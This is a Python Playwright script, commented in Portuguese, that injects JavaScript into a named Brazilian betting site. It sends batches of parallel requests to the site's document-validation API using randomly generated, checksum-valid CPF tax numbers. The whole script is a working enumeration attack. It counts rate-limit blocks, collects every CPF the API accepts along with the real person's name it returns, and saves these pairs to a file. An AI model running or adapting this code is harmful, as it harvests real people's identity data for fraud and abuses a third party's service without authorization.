#!/usr/bin/env python3
"""
Injetor via Browser V2 - Corrigido
"""
import random
import time
from playwright.sync_api import sync_playwright

def gerar_cpf():
    cpf = [random.randint(0, 9) for _ in range(9)]
    soma = sum((10 - i) * cpf[i] for i in range(9))
    resto = soma % 11
    cpf.append(0 if resto < 2 else 11 - resto)
    soma = sum((11 - i) * cpf[i] for i in range(10))
    resto = soma % 11
    cpf.append(0 if resto < 2 else 11 - resto)
    return ''.join(map(str, cpf))

def main():
    print("="*60)
    print("💉 INJETOR VIA BROWSER V2")
    print("="*60)
    
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)
        context = browser.new_context()
        page = context.new_page()
        
        print("\n🌐 Acessando site...")
        page.goto("https://7k.bet.br/")
        page.wait_for_timeout(5000)
        print("✅ Site carregado")
        
        # Injeta código
        page.evaluate("""() => {
            window.stats = {ok: 0, validos: [], blocked: 0, erro: 0};
            
            window.validarCPF = async (cpf) => {
                try {
                    const response = await fetch('/api/documents/validate', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({number: cpf, type: 'cpf'})
                    });
                    
                    const status = response.status;
                    
                    if (status === 200) {
                        const data = await response.json();
                        window.stats.ok++;
                        window.stats.validos.push({cpf, nome: data.data?.name || 'N/A'});
                        return 200;
                    } else if (status === 400) {
                        window.stats.ok++;
                        return 400;
                    } else if (status === 403) {
                        window.stats.blocked++;
                        return 403;
                    } else {
                        window.stats.erro++;
                        return status;
                    }
                } catch (e) {
                    window.stats.erro++;
                    return -1;
                }
            };
        }""")
        
        total = 200
        batch_size = 20
        batches = total // batch_size
        
        print(f"\n🚀 Iniciando {total} requisições ({batch_size} paralelas x {batches} lotes)")
        
        inicio = time.time()
        
        for batch in range(batches):
            cpfs = [gerar_cpf() for _ in range(batch_size)]
            
            # Executa em paralelo
            page.evaluate("""async (cpfs) => {
                await Promise.all(cpfs.map(cpf => window.validarCPF(cpf)));
            }""", cpfs)
            
            stats = page.evaluate("() => window.stats")
            elapsed = time.time() - inicio
            done = (batch + 1) * batch_size
            rate = done / elapsed if elapsed > 0 else 0
            
            print(f"[{batch+1:2d}/{batches}] ✅{stats['ok']:4d} ok | 🎯{len(stats['validos']):3d} válidos | 🚫{stats['blocked']:3d} blocked | {rate:.1f} req/s")
            
            time.sleep(0.3)
        
        tempo = time.time() - inicio
        final = page.evaluate("() => window.stats")
        
        print("\n" + "="*60)
        print("📊 RESULTADO FINAL")
        print("="*60)
        print(f"   Total: {total} req em {tempo:.1f}s")
        print(f"   Velocidade: {total/tempo:.1f} req/s")
        print(f"\n   ✅ OK: {final['ok']}")
        print(f"   🎯 Válidos: {len(final['validos'])}")
        print(f"   🚫 Blocked: {final['blocked']}")
        print(f"   💥 Erros: {final['erro']}")
        
        if final['validos']:
            print(f"\n🎯 CPFs VÁLIDOS ({len(final['validos'])}):")
            for v in final['validos'][:30]:
                cpf = v['cpf']
                print(f"   {cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]} | {v['nome']}")
            
            with open("cpfs_browser.txt", "w", encoding="utf-8") as f:
                for v in final['validos']:
                    cpf = v['cpf']
                    f.write(f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]} | {v['nome']}\n")
            print(f"\n💾 Salvos em cpfs_browser.txt")
        
        print("\n⏳ Fechando em 3s...")
        time.sleep(3)
        browser.close()

if __name__ == "__main__":
    main()







